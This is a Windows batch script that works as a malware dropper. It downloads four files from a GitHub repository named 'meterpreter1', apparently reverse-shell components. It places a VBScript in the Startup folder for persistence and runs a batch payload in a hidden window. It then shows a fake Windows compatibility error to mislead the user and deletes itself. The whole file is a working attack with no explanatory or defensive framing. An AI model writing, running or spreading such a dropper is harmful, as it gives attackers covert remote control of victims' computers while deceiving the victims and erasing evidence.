@echo off
curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/rev1.bat -o "%temp%\rev1.bat"
curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/sh1.ps1 -o "%temp%\sh1.ps1"
curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/start.vbs -o "%temp%\start.vbs"
curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/nihbtdtdow1.bat -o "%temp%\nihbtdtdow1.bat"
move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
powershell -c "Start-Process -FilePath "%temp%\rev1.bat" -WindowStyle Hidden"
echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
timeout /t 3 >nul
del "%~f0"
